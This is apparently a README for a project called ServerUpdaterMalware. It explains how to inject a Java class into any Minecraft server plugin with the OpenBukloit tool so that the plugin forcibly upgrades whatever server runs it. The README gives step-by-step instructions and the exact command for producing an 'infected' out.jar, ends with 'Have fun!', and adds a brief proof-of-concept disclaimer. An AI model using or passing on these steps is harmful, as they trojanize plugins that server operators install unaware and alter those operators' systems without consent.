# ServerUpdaterMalware
This is for forcefully upgrading a server to 1.19.3.
Excuse me if this is badly written.

The ServerJarUpdater.java has to be injected to any plugin, for example with https://github.com/VoxelHax/OpenBukloit.

Instructions with OpenBukloit:
1. Download the ServerJarUpdater.java file and the latest OpenBukloit jar release.
2. Create a folder. You have to have the ServerJarUpdater.java, OpenBukloit-1.x.x.jar, and the plugin jar to be injected in it.
3. Run `java -jar OpenBukloit-1.x.x.jar -e ServerJarUpdater.java -m single -i plugin-to-be-injected.jar --no-camouflage`.
4. It should generate a jar file called `out.jar` infected. Have fun!

DONT USE THIS WITH MALICIOUS INTENTIONS. IT'S JUST A PROOF OF CONCEPT.
